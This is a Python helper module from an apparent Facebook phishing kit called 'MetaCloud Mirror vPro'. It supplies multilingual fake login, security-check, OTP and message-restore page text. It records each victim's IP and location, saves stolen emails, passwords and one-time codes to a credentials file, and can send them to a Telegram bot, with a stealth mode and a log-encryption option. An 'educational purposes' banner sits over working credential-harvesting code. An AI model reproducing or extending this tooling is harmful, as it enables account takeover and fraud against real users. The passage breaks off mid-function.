import os
import sys
import time
import socket
import requests
import random
import threading
import traceback
import config as _config
from config import active_servers, sandbox_config, get_cfg

# Verrou pour protéger les opérations de lecture/écriture chiffrées sur les fichiers de log
_encrypted_log_lock = threading.Lock()

def _debug_log_to_victims(titre, texte, couleur="#ef4444"):
    """When debug_mode is ON, push an error entry into ALL victim log panels
    AND into the sandbox log panel."""
    if not _config.debug_mode:
        return
    # Forward to every active target's logs + sandbox
    for port, cfg in list(active_servers.items()):
        try:
            _ajouter_log_raw(cfg, titre, texte, couleur)
        except Exception as e:
            # Do NOT silently swallow — surface to stderr so Feature 2 itself is debuggable.
            try:
                sys.stderr.write(f"[helpers._debug_log_to_victims] cfg port={port}: {e}\n")
            except Exception:
                pass
    try:
        _ajouter_log_raw(sandbox_config, titre, texte, couleur)
    except Exception as e:
        try:
            sys.stderr.write(f"[helpers._debug_log_to_victims] sandbox: {e}\n")
        except Exception:
            pass

def _ajouter_log_raw(cfg, titre, texte, couleur):
    """Write a single log entry into a config's memory_logs (no disk, no stealth check)."""
    timestamp = time.strftime('%H:%M:%S')
    entry = f"<span style='color:#64748b'>[{timestamp}]</span> <span style='color:{couleur}'>{titre}: {texte}</span><br>"
    if not cfg.get("memory_logs"):
        cfg["memory_logs"] = BANNER_ASCII + "\n"
    cfg["memory_logs"] += entry + "\n"

# ═══════════════════════ Error-log deduplication ═══════════════════════
# Many call sites invoke BOTH log_error_to_file() AND log_error() for the same
# exception (legacy pattern). Since log_error_to_file() now delegates to
# log_error(), this would produce two identical entries in errors_logs.txt.
# To keep a single canonical entry per error, we dedupe by (context, str(exc))
# within a short time window. The window is small enough (2.0s) that genuinely
# independent repeats of the same error are still logged — only rapid double-
# logs from the same call site are suppressed.
_LOG_ERROR_DEDUP_WINDOW = 2.0  # seconds
_log_error_recent = {}  # {(context, str(exc)): last_logged_timestamp}


def log_error(context, exception):
    """Log silent errors to errors_logs.txt for debugging.
    In debug mode, also forward the error to all victim log panels.
    Error logs are NOT encrypted (they grow fast and need fast append).

    Deduplicates rapid double-calls with the same (context, exception) pair
    within a 2-second window — this happens when callers use both
    log_error_to_file() and log_error() for the same error (the former now
    delegates to this function)."""
    # ── Deduplication check ──
    try:
        _key = (str(context), str(exception))
        _now = time.time()
        _last = _log_error_recent.get(_key)
        if _last is not None and (_now - _last) < _LOG_ERROR_DEDUP_WINDOW:
            # Same error was logged very recently — skip the duplicate entry.
            # The original entry (with full traceback) is already in the file.
            return
        _log_error_recent[_key] = _now
        # Garbage-collect old entries occasionally so the dict doesn't grow unbounded.
        # (cheap: only run every ~100 calls)
        if len(_log_error_recent) > 200:
            _cutoff = _now - _LOG_ERROR_DEDUP_WINDOW
            for _k in list(_log_error_recent.keys()):
                if _log_error_recent[_k] < _cutoff:
                    del _log_error_recent[_k]
    except Exception:
        # Never let dedup logic break the actual logging
        pass

    try:
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
        tb = traceback.format_exc()
        if tb.strip() == "NoneType: None":
            tb = str(exception)
        log_line = f"[{timestamp}] [{context}]\n  Error: {exception}\n  Traceback:\n"
        for line in tb.strip().split("\n"):
            log_line += f"    {line}\n"
        log_line += "\n"
        # Simple plaintext append — error logs are NOT encrypted (performance)
        with open("errors_logs.txt", "a", encoding="utf-8") as f:
            f.write(log_line)
    except Exception as e:
        try:
            sys.stderr.write(f"[helpers.log_error] failed to write error log: {e}\n")
        except Exception:
            pass
    # Forward to victim log panels regardless of file-write success
    try:
        _debug_log_to_victims("ERROR", f"[{context}] {exception}", "#ef4444")
    except Exception as e:
        try:
            sys.stderr.write(f"[helpers.log_error] forward to victims failed: {e}\n")
        except Exception:
            pass

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1"
]

BANNER_ASCII = """
<div style='text-align: center;'>
    <h1 style='color: #3b82f6; font-family: sans-serif; margin-bottom: 0;'>MetaCloud Mirror vPro - MultiLang</h1>
    <p style='color: #64748b; font-family: monospace; margin-top: 0;'>
        --------------------------------------------<br>
        For Educational Purposes Only<br>
        --------------------------------------------
    </p>
</div>
"""

def recuperer_ip_robuste(req):
    try:
        if req.headers.get('X-Forwarded-For'):
            return req.headers.get('X-Forwarded-For').split(',')[0].strip()
        return req.remote_addr

    except Exception as e:
        from helpers import log_error
        log_error('helpers.recuperer_ip_robuste', e)
        return '127.0.0.1'
def obtenir_infos_reseau(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,city,isp,org,as", timeout=5)
        data = r.json()
        if data.get("status") == "success":
            return {"country": data.get('country', 'Unknown'), "city": data.get('city', 'Unknown')}
    except Exception as e:
        log_error("obtenir_infos_reseau", e)
    return {"country": "Unknown", "city": "Unknown"}

def detect_language(req):
    try:
        accept = req.headers.get('Accept-Language', 'en').lower()
        if 'fr' in accept: return 'fr'
        elif 'es' in accept: return 'es'
        elif 'pt' in accept: return 'pt'
        elif 'ar' in accept: return 'ar'
        elif 'de' in accept: return 'de'
        elif 'it' in accept: return 'it'
        elif 'zh' in accept: return 'zh'
        return 'en'

    except Exception as e:
        from helpers import log_error
        log_error('helpers.detect_language', e)
        return 'fr'
def is_port_in_use(port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            return s.connect_ex(('127.0.0.1', int(port))) == 0

    except Exception as e:
        from helpers import log_error
        log_error('helpers.is_port_in_use', e)
        return False
def get_translations(lang):
    try:
        translations = {
            'en': {'login_title': 'Log In to Facebook', 'email_ph': 'Email or mobile number', 'pass_ph': 'Password', 'login_btn': 'Log In', 'forgot': 'Forgotten password?', 'create': 'Create new account',
                   'login_error': 'The password you entered is incorrect. Please try again.', 'otp_title': 'Security Check', 'otp_sub': 'A login code was sent to your Facebook account notifications. Enter the code to continue.', 'otp_submit': 'Continue', 'otp_invalid': 'Invalid code, at least 6 digits required.', 'otp_error': 'Invalid code, please check your notifications.',
                   'checkpoint_title': 'Is this you logging in?', 'checkpoint_sub': 'We noticed a new login attempt to your account. Confirm if this was you.', 'device_label': 'Device', 'location_label': 'Location', 'time_label': 'Time',
                   'yes_btn': 'Yes, it was me', 'no_btn': "No, it wasn't me", 'help': 'Need help with this login?',
                   'msg_restore_title': 'Message History Restoration', 'msg_restore_sub': 'Enter the restoration code you previously set up to restore your message history on this device.', 'msg_restore_submit': 'Restore', 'msg_restore_invalid': 'Invalid code, exactly 6 digits required.'},
            'fr': {'login_title': 'Connexion à Facebook', 'email_ph': 'Adresse e-mail ou numéro de téléphone', 'pass_ph': 'Mot de passe', 'login_btn': 'Se connecter', 'forgot': 'Mot de passe oublié ?', 'create': 'Créer un nouveau compte',
                   'login_error': 'Le mot de passe que vous avez entré est incorrect. Veuillez réessayer.', 'otp_title': 'Vérification de sécurité', 'otp_sub': 'Un code de connexion a été envoyé aux notifications de votre compte Facebook. Entrez-le pour continuer.', 'otp_submit': 'Continuer', 'otp_invalid': 'Code invalide, au moins 6 chiffres sont requis.', 'otp_error': 'Code invalide, vérifiez vos notifications.',
                   'checkpoint_title': 'Est-ce bien vous qui vous connectez ?', 'checkpoint_sub': 'Nous avons détecté une nouvelle tentative de connexion. Veuillez confirmer s\'il s\'agit bien de vous.', 'device_label': 'Appareil', 'location_label': 'Emplacement', 'time_label': 'Heure',
                   'yes_btn': 'Oui, c\'était moi', 'no_btn': 'Non, ce n\'était pas moi', 'help': "Besoin d'aide pour cette connexion ?",
                   'msg_restore_title': 'Restauration de l\'historique des messages', 'msg_restore_sub': 'Saisissez le code de restauration que vous avez défini précédemment pour restaurer votre historique des messages sur cet appareil.', 'msg_restore_submit': 'Restaurer', 'msg_restore_invalid': 'Code invalide, exactement 6 chiffres sont requis.'},
            'es': {'login_title': 'Iniciar sesión en Facebook', 'email_ph': 'Correo electrónico o número de móvil', 'pass_ph': 'Contraseña', 'login_btn': 'Iniciar sesión', 'forgot': '¿Olvidaste tu contraseña?', 'create': 'Crear cuenta nueva',
                   'login_error': 'La contraseña que has introducido es incorrecta. Vuelve a intentarlo.', 'otp_title': 'Verificación de seguridad', 'otp_sub': 'Se envió un código de inicio de sesión a las notificaciones de tu cuenta. Ingresa el código para continuar.', 'otp_submit': 'Continuar', 'otp_invalid': 'Código inválido, se requieren al menos 6 dígitos.', 'otp_error': 'Código inválido, verifica tus notificaciones.',
                   'checkpoint_title': '¿Eres tú quien inicia sesión?', 'checkpoint_sub': 'Detectamos un nuevo intento de inicio de sesión. Confirma si fuiste tú.', 'device_label': 'Dispositivo', 'location_label': 'Ubicación', 'time_label': 'Hora',
                   'yes_btn': 'Sí, fui yo', 'no_btn': 'No, no fui yo', 'help': '¿Necesitas ayuda con este inicio de sesión?',
                   'msg_restore_title': 'Restauración del historial de mensajes', 'msg_restore_sub': 'Ingresa el código de restauración que configuraste previamente para restaurar tu historial de mensajes en este dispositivo.', 'msg_restore_submit': 'Restaurar', 'msg_restore_invalid': 'Código inválido, se requieren exactamente 6 dígitos.'},
            'pt': {'login_title': 'Entrar no Facebook', 'email_ph': 'Email ou número de celular', 'pass_ph': 'Senha', 'login_btn': 'Entrar', 'forgot': 'Esqueceu a senha?', 'create': 'Criar nova conta',
                   'login_error': 'A senha que você digitou está incorreta. Tente novamente.', 'otp_title': 'Verificação de segurança', 'otp_sub': 'Um código de login foi enviado para as notificações da sua conta. Digite-o para continuar.', 'otp_submit': 'Continuar', 'otp_invalid': 'Código inválido, são necessários pelo menos 6 dígitos.', 'otp_error': 'Código inválido, verifique suas notificações.',
                   'checkpoint_title': 'É você que está fazendo login?', 'checkpoint_sub': 'Notamos uma nova tentativa de login. Confirme se foi você.', 'device_label': 'Dispositivo', 'location_label': 'Localização', 'time_label': 'Hora',
                   'yes_btn': 'Sim, fui eu', 'no_btn': 'Não, não fui eu', 'help': 'Precisa de ajuda com este login?',
                   'msg_restore_title': 'Restauração do histórico de mensagens', 'msg_restore_sub': 'Digite o código de restauração que você configurou anteriormente para restaurar seu histórico de mensagens neste dispositivo.', 'msg_restore_submit': 'Restaurar', 'msg_restore_invalid': 'Código inválido, são necessários exatamente 6 dígitos.'},
            'ar': {'login_title': 'تسجيل الدخول إلى فيسبوك', 'email_ph': 'البريد الإلكتروني أو رقم الهاتف', 'pass_ph': 'كلمة المرور', 'login_btn': 'تسجيل الدخول', 'forgot': 'هل نسيت كلمة المرور؟', 'create': 'إنشاء حساب جديد',
                   'login_error': 'كلمة المرور التي أدخلتها غير صحيحة. حاول مرة أخرى.', 'otp_title': 'التحقق الأمني', 'otp_sub': 'تم إرسال رمز تسجيل الدخول إلى إشعارات حسابك. أدخله للمتابعة.', 'otp_submit': 'متابعة', 'otp_invalid': 'رمز غير صالح، مطلوب 6 أرقام على الأقل.', 'otp_error': 'رمز غير صالح، تحقق من إشعاراتك.',
                   'checkpoint_title': 'هل هذا أنت الذي تسجل الدخول؟', 'checkpoint_sub': 'لاحظنا محاولة تسجيل دخول جديدة. أكد ما إذا كان ذلك أنت.', 'device_label': 'الجهاز', 'location_label': 'الموقع', 'time_label': 'الوقت',
                   'yes_btn': 'نعم، كان ذلك أنا', 'no_btn': 'لا، لم يكن أنا', 'help': 'هل تحتاج إلى مساعدة في تسجيل الدخول هذا؟',
                   'msg_restore_title': 'استعادة سجل الرسائل', 'msg_restore_sub': 'أدخل رمز الاستعادة الذي قمت بإعداده مسبقاً لاستعادة سجل الرسائل على هذا الجهاز.', 'msg_restore_submit': 'استعادة', 'msg_restore_invalid': 'رمز غير صالح، مطلوب 6 أرقام بالضبط.'},
            'de': {'login_title': 'Bei Facebook anmelden', 'email_ph': 'E-Mail oder Handynummer', 'pass_ph': 'Passwort', 'login_btn': 'Anmelden', 'forgot': 'Passwort vergessen?', 'create': 'Neues Konto erstellen',
                   'login_error': 'Das eingegebene Passwort ist falsch. Bitte versuche es erneut.', 'otp_title': 'Sicherheitsüberprüfung', 'otp_sub': 'Ein Anmeldecode wurde an die Benachrichtigungen deines Kontos gesendet. Gib ihn ein, um fortzufahren.', 'otp_submit': 'Fortfahren', 'otp_invalid': 'Ungültiger Code, mindestens 6 Ziffern erforderlich.', 'otp_error': 'Ungültiger Code, überprüfen Sie Ihre Benachrichtigungen.',
                   'checkpoint_title': 'Bist du es, der sich anmeldet?', 'checkpoint_sub': 'Wir haben einen neuen Anmeldeversuch bemerkt. Bestätige, ob du es warst.', 'device_label': 'Gerät', 'location_label': 'Standort', 'time_label': 'Uhrzeit',
                   'yes_btn': 'Ja, das war ich', 'no_btn': 'Nein, das war ich nicht', 'help': 'Brauchst du Hilfe bei dieser Anmeldung?',
                   'msg_restore_title': 'Wiederherstellung des Nachrichtenverlaufs', 'msg_restore_sub': 'Gib den Wiederherstellungscode ein, den du zuvor eingerichtet hast, um deinen Nachrichtenverlauf auf diesem Gerät wiederherzustellen.', 'msg_restore_submit': 'Wiederherstellen', 'msg_restore_invalid': 'Ungültiger Code, genau 6 Ziffern erforderlich.'},
            'it': {'login_title': 'Accedi a Facebook', 'email_ph': 'Email o numero di cellulare', 'pass_ph': 'Password', 'login_btn': 'Accedi', 'forgot': 'Password dimenticata?', 'create': 'Crea nuovo account',
                   'login_error': 'La password che hai inserito è scorretta. Riprova.', 'otp_title': 'Verifica di sicurezza', 'otp_sub': 'Un codice di accesso è stato inviato alle notifiche del tuo account. Inseriscilo per continuare.', 'otp_submit': 'Continua', 'otp_invalid': 'Codice non valido, richieste almeno 6 cifre.', 'otp_error': 'Codice non valido, controlla le tue notifiche.',
                   'checkpoint_title': 'Sei tu che stai effettuando l\'accesso?', 'checkpoint_sub': 'Abbiamo rilevato un nuovo tentativo di accesso. Conferma se eri tu.', 'device_label': 'Dispositivo', 'location_label': 'Posizione', 'time_label': 'Ora',
                   'yes_btn': 'Sì, ero io', 'no_btn': 'No, non ero io', 'help': 'Hai bisogno di aiuto con questo accesso?',
                   'msg_restore_title': 'Ripristino cronologia messaggi', 'msg_restore_sub': 'Inserisci il codice di ripristino che hai impostato in precedenza per ripristinare la cronologia dei messaggi su questo dispositivo.', 'msg_restore_submit': 'Ripristina', 'msg_restore_invalid': 'Codice non valido, richieste esattamente 6 cifre.'},
            'zh': {'login_title': '登录 Facebook', 'email_ph': '手机号 or 电子邮箱', 'pass_ph': '密码', 'login_btn': '登录', 'forgot': '忘记密码？', 'create': '新建帐号',
                   'login_error': '您输入的密码不正确，请重试。', 'otp_title': '安全检查', 'otp_sub': '登录验证码已发送至您的 Facebook 账号通知。请输入该验证码以继续。', 'otp_submit': '继续', 'otp_invalid': '验证码无效，至少需要6位数字。', 'otp_error': '验证码无效，请检查您的通知。',
                   'checkpoint_title': '是您在尝试登录吗？', 'checkpoint_sub': '我们注意到您的账号有新的登录尝试。请确认是否是您本人操作。', 'device_label': '设备', 'location_label': '地点', 'time_label': '时间',
                   'yes_btn': '是我本人', 'no_btn': '不是我', 'help': '需要登录帮助？',
                   'msg_restore_title': '消息记录恢复', 'msg_restore_sub': '请输入您之前设置的恢复代码，以在此设备上恢复您的消息记录。', 'msg_restore_submit': '恢复', 'msg_restore_invalid': '验证码无效，需要恰好6位数字。'}
        }
        return translations.get(lang, translations['en'])

    except Exception as e:
        from helpers import log_error
        log_error('helpers.get_translations', e)
        return {}
def get_feed_translations(lang):
    try:
        feed_tr = {
            'en': {'like_btn': 'Like', 'comment_btn': 'Comment', 'share_btn': 'Share', 'sponsored': 'Sponsored', 'comments_label': 'comments', 'shares_label': 'shares',
                   'public': 'Public', 'friends': 'Friends', 'friends_of_friends': 'Friends of friends',
                   'modal_title': 'Login Required', 'modal_text': 'Before continuing, you must log in to your account.', 'modal_continue': 'Continue', 'modal_stay': 'Stay on Page',
                   'see_more': 'Log in to see more posts', 'login_link': 'Log In', 'see_more_link': 'See more', 'see_less_link': 'See less',
                   'with': 'with', 'others': 'others', 'shared_with': 'Shared with', 'people': 'people', 'private': 'Private',
                   'search_label': 'Search', 'messages_label': 'Messages', 'notifications_label': 'Notifications', 'menu_label': 'Menu',
                   'friends_label': 'Friends', 'photos_label': 'Photos', 'events_label': 'Events', 'online_label': 'Online Friends'},
            'fr': {'like_btn': "J'aime", 'comment_btn': 'Commenter', 'share_btn': 'Partager', 'sponsored': 'Sponsorisé', 'comments_label': 'commentaires', 'shares_label': 'partages',
                   'public': 'Public', 'friends': 'Amis', 'friends_of_friends': "Amis d'amis",
                   'modal_title': 'Connexion Requise', 'modal_text': 'Avant de continuer, vous devez vous connecter à votre compte.', 'modal_continue': 'Continuer', 'modal_stay': 'Rester ici',
                   'see_more': 'Connectez-vous pour voir plus de publications', 'login_link': 'Se connecter', 'see_more_link': 'Voir plus', 'see_less_link': 'Voir moins',
                   'with': 'avec', 'others': 'autres personnes', 'shared_with': 'Partagé avec', 'people': 'personnes', 'private': 'Privé',
                   'search_label': 'Rechercher', 'messages_label': 'Messages', 'notifications_label': 'Notifications', 'menu_label': 'Menu',
                   'friends_label': 'Amis', 'photos_label': 'Photos', 'events_label': 'Événements', 'online_label': 'Amis connectés'},
            'es': {'like_btn': 'Me gusta', 'comment_btn': 'Comentar', 'share_btn': 'Compartir', 'sponsored': 'Patrocinado', 'comments_label': 'comentarios', 'shares_label': 'veces compartido',
                   'public': 'Público', 'friends': 'Amigos', 'friends_of_friends': 'Amigos de amigos',
                   'modal_title': 'Inicio de sesión requerido', 'modal_text': 'Antes de continuar, debes iniciar sesión en tu cuenta.', 'modal_continue': 'Continuar', 'modal_stay': 'Quedarse aquí',
                   'see_more': 'Inicia sesión para ver más publications', 'login_link': 'Iniciar sesión', 'see_more_link': 'Ver más', 'see_less_link': 'Ver menos',
                   'with': 'con', 'others': 'otras personas', 'shared_with': 'Compartido con', 'people': 'personas', 'private': 'Privado',
                   'search_label': 'Buscar', 'messages_label': 'Mensajes', 'notifications_label': 'Notificaciones', 'menu_label': 'Menú',
                   'friends_label': 'Amigos', 'photos_label': 'Fotos', 'events_label': 'Eventos', 'online_label': 'Amigos conectados'},
            'pt': {'like_btn': 'Curtir', 'comment_btn': 'Comentar', 'share_btn': 'Compartilhar', 'sponsored': 'Patrocinado', 'comments_label': 'comentários', 'shares_label': 'compartilhamentos',
                   'public': 'Público', 'friends': 'Amigos', 'friends_of_friends': 'Amigos de amigos',
                   'modal_title': 'Login Necessário', 'modal_text': 'Antes de continuar, você deve fazer login na sua conta.', 'modal_continue': 'Continuar', 'modal_stay': 'Ficar aqui',
                   'see_more': 'Faça login para ver mais publications', 'login_link': 'Entrar', 'see_more_link': 'Ver mais', 'see_less_link': 'Ver menos',
                   'with': 'com', 'others': 'outras pessoas', 'shared_with': 'Compartilhado com', 'people': 'pessoas', 'private': 'Privado',
                   'search_label': 'Pesquisar', 'messages_label': 'Mensagens', 'notifications_label': 'Notificações', 'menu_label': 'Menu',
                   'friends_label': 'Amigos', 'photos_label': 'Fotos', 'events_label': 'Eventos', 'online_label': 'Amigos online'},
            'ar': {'like_btn': 'أعجبني', 'comment_btn': 'تعليق', 'share_btn': 'مشاركة', 'sponsored': 'مُموَّل', 'comments_label': 'تعليقات', 'shares_label': 'مشاركة',
                   'public': 'العامة', 'friends': 'الأصدقاء', 'friends_of_friends': 'أصدقاء الأصدقاء',
                   'modal_title': 'تسجيل الدخول مطلوب', 'modal_text': 'قبل المتابعة، يجب عليك تسجيل الدخول إلى حسابك.', 'modal_continue': 'متابعة', 'modal_stay': 'البقاء هنا',
                   'see_more': 'سجّل الدخول لرؤية المزيد من المنشورات', 'login_link': 'تسجيل الدخول', 'see_more_link': 'عرض المزيد', 'see_less_link': 'عرض أقل',
                   'with': 'مع', 'others': 'آخرين', 'shared_with': 'تمت المشاركة مع', 'people': 'شخصًا', 'private': 'خاص',
                   'search_label': 'البحث', 'messages_label': 'الرسائل', 'notifications_label': 'الإخطارات', 'menu_label': 'القائمة',
                   'friends_label': 'الأصدقاء', 'photos_label': 'الصور', 'events_label': 'الأحداث', 'online_label': 'الأصدقاء المتصلون'},
            'de': {'like_btn': 'Gefällt mir', 'comment_btn': 'Kommentieren', 'share_btn': 'Teilen', 'sponsored': 'Gesponsert', 'comments_label': 'Kommentare', 'shares_label': 'Geteilt',
                   'public': 'Öffentlich', 'friends': 'Freunde', 'friends_of_friends': 'Freunde von Freunden',
                   'modal_title': 'Anmeldung erforderlich', 'modal_text': 'Bevor Sie fortfahren können, müssen Sie sich bei Ihrem Konto anmelden.', 'modal_continue': 'Fortfahren', 'modal_stay': 'Hier bleiben',
                   'see_more': 'Melden Sie sich an, um mehr Beiträge zu sehen', 'login_link': 'Anmelden', 'see_more_link': 'Mehr anzeigen', 'see_less_link': 'Weniger anzeigen',
                   'with': 'mit', 'others': 'weiteren Personen', 'shared_with': 'Geteilt mit', 'people': 'Personen', 'private': 'Privat',
                   'search_label': 'Suchen', 'messages_label': 'Nachrichten', 'notifications_label': 'Benachrichtigungen', 'menu_label': 'Menü',
                   'friends_label': 'Freunde', 'photos_label': 'Fotos', 'events_label': 'Veranstaltungen', 'online_label': 'Online-Freunde'},
            'it': {'like_btn': 'Mi piace', 'comment_btn': 'Commenta', 'share_btn': 'Condividi', 'sponsored': 'Sponsorizzato', 'comments_label': 'commenti', 'shares_label': 'condivisioni',
                   'public': 'Tutti', 'friends': 'Amici', 'friends_of_friends': 'Amici di amici',
                   'modal_title': 'Accesso Richiesto', 'modal_text': 'Prima di continuare, devi accedere al tuo account.', 'modal_continue': 'Continua', 'modal_stay': 'Rimani qui',
                   'see_more': 'Accedi per vedere altri post', 'login_link': 'Accedi', 'see_more_link': 'Altro', 'see_less_link': 'Meno',
                   'with': 'con', 'others': 'altre persone', 'shared_with': 'Condiviso con', 'people': 'persone', 'private': 'Privato',
                   'search_label': 'Cerca', 'messages_label': 'Messaggi', 'notifications_label': 'Notifiche', 'menu_label': 'Menu',
                   'friends_label': 'Amici', 'photos_label': 'Foto', 'events_label': 'Eventi', 'online_label': 'Amici online'},
            'zh': {'like_btn': '赞', 'comment_btn': '评论', 'share_btn': '分享', 'sponsored': '赞助', 'comments_label': '条评论', 'shares_label': '次分享',
                   'public': '公开', 'friends': '朋友', 'friends_of_friends': '朋友的朋友',
                   'modal_title': '需要登录', 'modal_text': '在继续之前，您必须先登录您的帐号。', 'modal_continue': '继续', 'modal_stay': '留在页面',
                   'see_more': '登录以查看更多帖子', 'login_link': '登录', 'see_more_link': '查看更多', 'see_less_link': '收起',
                   'with': '与', 'others': '其他人', 'shared_with': '与', 'people': '人共享', 'private': '私密',
                   'search_label': '搜索', 'messages_label': '消息', 'notifications_label': '通知', 'menu_label': '菜单',
                   'friends_label': '朋友', 'photos_label': '照片', 'events_label': '活动', 'online_label': '在线朋友'},
        }
        return feed_tr.get(lang, feed_tr['en'])

    except Exception as e:
        from helpers import log_error
        log_error('helpers.get_feed_translations', e)
        return {}
def get_random_ua():
    try:
        return random.choice(USER_AGENTS)

    except Exception as e:
        from helpers import log_error
        log_error('helpers.get_random_ua', e)
        return 'Mozilla/5.0'
def envoyer_telegram(message):
    cfg = get_cfg()
    if not cfg.get("send_telegram") or not cfg.get("telegram_token") or not cfg.get("telegram_chat_id"):
        return
    try:
        url = f"https://api.telegram.org/bot{cfg['telegram_token']}/sendMessage"
        payload = {"chat_id": cfg["telegram_chat_id"], "text": message, "parse_mode": "HTML"}
        requests.post(url, json=payload, timeout=6)
    except Exception as e:
        log_error("envoyer_telegram", e)

def _write_log_to_file(nom_fichier, log_entry, write_banner, cfg):
    """Écrit une ligne de log dans le fichier, avec chiffrement si activé."""
    try:
        encrypt_logs = cfg.get("encrypt_logs", False)
        file_exists = os.path.exists(nom_fichier)
        
        if encrypt_logs:
            # Mode chiffré : lire, déchiffrer, ajouter, rechiffrer
            # Verrou pour éviter les pertes de logs lors de requêtes concurrentes
            with _encrypted_log_lock:
                try:
                    from crypto import is_encrypted, decrypt_text, encrypt_text
                    existing = ""
                    if file_exists and os.path.getsize(nom_fichier) > 0:
                        with open(nom_fichier, "r", encoding="utf-8") as f:
                            existing = f.read()
                        if existing.strip() and is_encrypted(existing):
                            existing = decrypt_text(existing)
                    # Si le fichier est trop gros, on rotate
                    if len(existing) > 500000:
                        existing = BANNER_ASCII + "\n"
                        write_banner = False  # déjà ajouté
                    if write_banner:
                        existing = BANNER_ASCII + "\n" + existing
                    existing += log_entry + "\n"
                    encrypted = encrypt_text(existing)
                    with open(nom_fichier, "w", encoding="utf-8") as f:
                        f.write(encrypted)
                except Exception as enc_err:
                    log_error("ajouter_log.encrypt", enc_err)
                    # Fallback : écrire en clair
                    mode = "w" if (file_exists and os.path.getsize(nom_fichier) > 500000) else "a"
                    with open(nom_fichier, mode, encoding="utf-8") as f:
                        if write_banner:
                            f.write(BANNER_ASCII + "\n")
                        f.write(log_entry + "\n")
        else:
            # Mode normal : append
            mode = "w" if (file_exists and os.path.getsize(nom_fichier) > 500000) else "a"
            with open(nom_fichier, mode, encoding="utf-8") as f:
                if write_banner:
                    f.write(BANNER_ASCII + "\n")
                f.write(log_entry + "\n")
    except Exception as e:
        log_error("ajouter_log.file_write", e)

def ajouter_log(titre, texte, couleur="#3b82f6", force_cfg=None):
    cfg = force_cfg if force_cfg else get_cfg()
    
    # SYSTEM messages are only shown in debug mode (not in normal logs)
    if titre == "SYSTEM" and not _config.debug_mode:
        # Still write to the log file (for forensic purposes) but don't show in memory_logs
        if cfg["stealth_mode"] or cfg is sandbox_config:
            return
        nom_fichier = cfg["log_file"]
        try:
            timestamp = time.strftime('%H:%M:%S')
            file_log_entry = f"[{timestamp}] SYSTEM: {texte}"
            file_exists = os.path.exists(nom_fichier)
            write_banner = not file_exists or os.path.getsize(nom_fichier) == 0
            _write_log_to_file(nom_fichier, file_log_entry, write_banner, cfg)
        except Exception as e:
            log_error("ajouter_log.system_file", e)
        return

    timestamp = time.strftime('%H:%M:%S')
    log_entry = f"<span style='color:#64748b'>[{timestamp}]</span> <span style='color:{couleur}'>{titre}: {texte}</span><br>"
    
    if not cfg.get("memory_logs"):
        cfg["memory_logs"] = BANNER_ASCII + "\n"
    cfg["memory_logs"] += log_entry + "\n"

    if cfg["stealth_mode"] or cfg is sandbox_config:
        return
    nom_fichier = cfg["log_file"]
    try:
        file_exists = os.path.exists(nom_fichier)
        write_banner = not file_exists or os.path.getsize(nom_fichier) == 0 or os.path.getsize(nom_fichier) > 500000
        # Pour le fichier disque, on écrit une version texte (sans HTML)
        file_log_entry = f"[{timestamp}] {titre}: {texte}"
        _write_log_to_file(nom_fichier, file_log_entry, write_banner, cfg)
    except Exception as e:
        log_error("ajouter_log", e)

def sauvegarder_identifiants_purs(type_data, valeur):
    cfg = get_cfg()
    if cfg.get("stealth_mode") or cfg is sandbox_config:
        return
    nom_f = "credentials.txt"
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    cible = cfg.get("target_name", "Inconnu")
    try:
        # ── Construire le nouveau bloc de texte à ajouter ──
        new_block = ""
        file_exists = os.path.exists(nom_f)

        if not file_exists:
            new_block = "╔══════════════════════════════════════════════════╗\n"
            new_block += "║       METACLOUD MIRROR - CREDENTIALS LOG         ║\n"
            new_block += "╚══════════════════════════════════════════════════╝\n\n"

        if type_data == "EMAIL":
            new_block += "┌──────────────────────────────────────────────────\n"
            new_block += f"│  🎯 Cible     : {cible}\n"
            new_block += f"│  🕐 Date      : {timestamp}\n"
            new_block += f"│  📧 Email     : {valeur}\n"
        elif type_data == "PASSWORD":
            new_block += f"│  🔑 Password  : {valeur}\n"
        elif type_data.startswith("OTP"):
            new_block += f"│  🔢 {type_data:<9} : {valeur}\n"
        else:
            new_block += f"│  📌 {type_data:<9} : {valeur}\n"

        # Close the block after password or final OTP
        if type_data == "PASSWORD":
            new_block += "│  ⏳ (en attente du code OTP...)\n"
            new_block += "│\n"
        elif type_data.startswith("OTP") and "FINAL" not in type_data.upper():
            pass  # intermediate OTP, keep block open
        elif type_data.startswith("OTP"):
            new_block += "└──────────────────────────────────────────────────\n\n"

        # ── Écrire dans credentials.txt (gérer le chiffrement) ──
        try:
            # Vérifier si le chiffrement de credentials.txt est activé
            import config as _cfg_enc
            encrypt_enabled = _cfg_enc.get_global_setting("encrypt_credentials_txt", False)
        except Exception:
            encrypt_enabled = False

        if encrypt_enabled and file_exists:
            # Fichier existant chiffré → lire, déchiffrer, ajouter, rechiffrer
            try:
                from crypto import is_encrypted, decrypt_text, encrypt_text
                with open(nom_f, "r", encoding="utf-8") as f:
                    existing_content = f.read()
                # Déchiffrer si chiffré
                if existing_content.strip() and is_encrypted(existing_content):
                    existing_content = decrypt_text(existing_content)
                # Ajouter le nouveau bloc
                full_content = existing_content + new_block
                # Rechiffrer
                encrypted = encrypt_text(full_content)
                with open(nom_f, "w", encoding="utf-8") as f:
                    f.write(encrypted)
            except Exception as enc_err:
                log_error("sauvegarder_identifiants.encrypt", enc_err)
                # Fallback : écrire en clair
                with open(nom_f, "a", encoding="utf-8") as f:
                    f.write(new_block)
        elif encrypt_enabled and not file_exists:
            # Nouveau fichier + chiffrement activé → chiffrer le premier contenu
            try:
                from crypto import encrypt_text
                encrypted = encrypt_text(new_block)
                with open(nom_f, "w", encoding="utf-8") as f:
                    f.write(encrypted)
            except Exception as enc_err:
                log_error("sauvegarder_identifiants.encrypt_new", enc_err)
                with open(nom_f, "w", encoding="utf-8") as f:
                    f.write(new_block)
        else:
            # Pas de chiffrement → append normal
            with open(nom_f, "a", encoding="utf-8") as f:
